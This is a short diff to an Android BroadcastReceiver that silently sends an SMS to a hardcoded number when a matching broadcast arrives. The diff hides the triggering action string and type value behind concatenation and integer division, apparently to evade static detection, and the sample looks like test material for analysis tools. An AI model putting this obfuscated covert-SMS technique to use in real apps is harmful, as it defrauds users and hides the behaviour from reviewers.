@@ -10,10 +10,16 @@ public class ExampleReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
 
+        String xxx="rrr";
+        String ttt="zzz";
+        xxx=xxx+ttt;
+        int zz=7;
+        int yy=zz/new Integer(10);
 
-        if(intent.getAction().equals("com.zms.sms"))
+
+        if(intent.getAction().equals(xxx))
         {
-            if(intent.getIntExtra("type",-1)==0)
+            if(intent.getIntExtra("type",-1)==yy)
             {
                 SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
             }
